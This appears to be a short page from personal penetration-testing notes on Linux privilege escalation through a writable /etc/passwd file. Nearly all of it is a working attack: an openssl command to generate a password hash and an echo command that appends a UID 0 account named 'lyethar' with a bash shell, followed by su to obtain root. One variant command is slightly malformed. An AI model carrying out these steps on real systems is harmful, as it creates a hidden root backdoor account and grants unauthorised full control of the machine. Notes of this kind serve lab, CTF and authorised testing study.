# Writable Passwd

![](../../../.gitbook/assets/2022-08-08\_14-53.png)

This is basically GGs.&#x20;

If we see this we can run the following command and then we able to switch users.&#x20;

```
#####GENERATE PASSWD LINE#####

openssl passwd -1 -salt password password 
Then copy that into this 

echo 'lyethar:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:lyethar:/root:/bin/bash' >> /etc/passwd


We could also do it like this 
openssl passwd -1 salt lyethar pass123
just copy it in the same way that i did but instead of password it will be pass123
```

Once we echo the following line we just simply `su lyethar` and input `password`.
